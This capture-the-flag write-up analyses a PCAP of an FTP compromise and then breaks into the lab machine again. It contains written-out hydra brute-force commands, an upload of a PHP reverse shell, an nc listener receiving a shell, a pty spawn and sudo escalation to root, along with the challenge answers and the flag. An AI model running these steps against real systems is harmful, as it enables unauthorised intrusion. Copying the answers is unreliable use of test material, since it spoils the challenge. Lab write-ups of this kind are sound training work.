# Task 1: Oh no! We've been hacked!
![[1 90.png]]
- We can open the PCAP file in Wireshark after downloading it.
![[2 89.png]]

## Question
> The attacker is trying to log into a specific service. What service is this?
- If we scroll a bit we can see the following packets.
![[3 68.png]]
- We can `Follow > TCP Stream`.
![[4 54.png]]
- This does look like a login attempt.
## Answer
```
ftp
```

## Question
> There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
## Answer
```
hydra
```

## Question
> The attacker is trying to log on with a specific username. What is the username?
- We saw the in TCP Stream that the username was `jenny`.
## Answer
```
jenny
```

## Question
> What is the user's password?
- If we change the stream to 7, we can find the correct password.
![[5 38.png]]
## Answer
```
password123
```

## Question
> What is the current FTP working directory after the attacker logged in?
- We can find the current working directory on setting the stream to 16.
![[6 27.png]]
## Answer
```
/var/www/html
```

## Question
> The attacker uploaded a backdoor. What is the backdoor's filename?
- We can find the answer in the same stream.
![[6 28.png]]
## Answer
```
shell.php
```

## Question
> The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
- In order to answer this question we have to filter the packets using the following filter:
```
ftp-data
```
- On inspecting the second packet, we can find the URL.
![[7 22.png]]
## Answer
```
http://pentestmonkey.net/tools/php-reverse-shell
```

## Question
> Which command did the attacker manually execute after getting a reverse shell?
- Let's navigate to stream 20.
![[8 18.png]]
## Answer
```
whoami
```

## Question
> What is the computer's hostname?
- In the same stream, we can find the computer's host name.
![[9 13.png]]
## Answer
```
wir3
```

## Question
> Which command did the attacker execute to spawn a new TTY shell?
- The answer is in the same stream.
![[10 10.png]]
## Answer
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Question
> Which command was executed to gain a root shell?
- Again in the same stream, we can find the answer.
![[11 5.png]]
## Answer
```
sudo su
```

## Question
> The attacker downloaded something from GitHub. What is the name of the GitHub project?
- We can find the git clone that the attacker used.
![[12 4.png]]
## Answer
```
Reptile
```

## Question
> The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
- This type of backdoor is called a Rootkit.
## Answer
```
Rootkit
```

# Task 2: Hack your way back into the machine
![[13 4.png]]
## Question
> Read the flag.txt file inside the Reptile directory
- Let's scan the target using `nmap`.
```
$ nmap -sC -sV 10.10.108.36 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 16:52 IST
Nmap scan report for 10.10.108.36
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.62 seconds
```
- As we can see there are three open ports:
	- Port 21: ftp
	- Port 80: http
- We know that the user `jenny` changed the password.
- Let's brute force it using `hydra`.
```
$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.108.36
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 17:02:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.108.36:21/
[21][ftp] host: 10.10.108.36   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 17:03:04 
```
- Let's login through FTP using `jenny` as the username and `987654321` as the password.
```
$ ftp jenny@10.10.108.36
Connected to 10.10.108.36.
220 Hello FTP World!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
- Let's look around to find something important,
```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
```
- We can download these files using the `get` command.
```
ftp> get shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for shell.php (5493 bytes).
100% |***********************************************************************************************************************************************************************************************|  5493       64.89 KiB/s    00:00 ETA
226 Transfer complete.
5493 bytes received in 00:00 (24.22 KiB/s)
ftp> get index.html
local: index.html remote: index.html
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for index.html (10918 bytes).
100% |***********************************************************************************************************************************************************************************************| 10918        3.20 MiB/s    00:00 ETA
226 Transfer complete.
10918 bytes received in 00:00 (81.19 KiB/s)
```
- We have to modify the shell a bit.
![[14 2.png]]
- We set he IP address to our `tun0` interface and the port to any port we like.
- Let's upload the modified `shell.php` using the `put` command.
```
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5494        3.20 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (19.89 KiB/s)
```
- We have successfully uploaded our `shell.php` file to the FTP server. 
- Let's start listening for connections using `nc`.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
```
- Now we have to download the shell through our browser.
![[15 1.png]]
- Let's check our listener.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.108.36] 49210
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 11:51:14 up 31 min,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
- Let's het a bash shell and switch user to `jenny`.
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ 
```
- Let's check what files `jenny` can execute without the password.
```
jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
```
- We have permissions to switch user to `root`.
```
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# 
```
- Let's read the flag.txt file inside the Reptile directory.
```
root@wir3:/# cat /root/Reptile/flag.txt
cat /root/Reptile/flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
```
## Answer
```
ebcefd66ca4b559d17b440b6e67fd0fd
```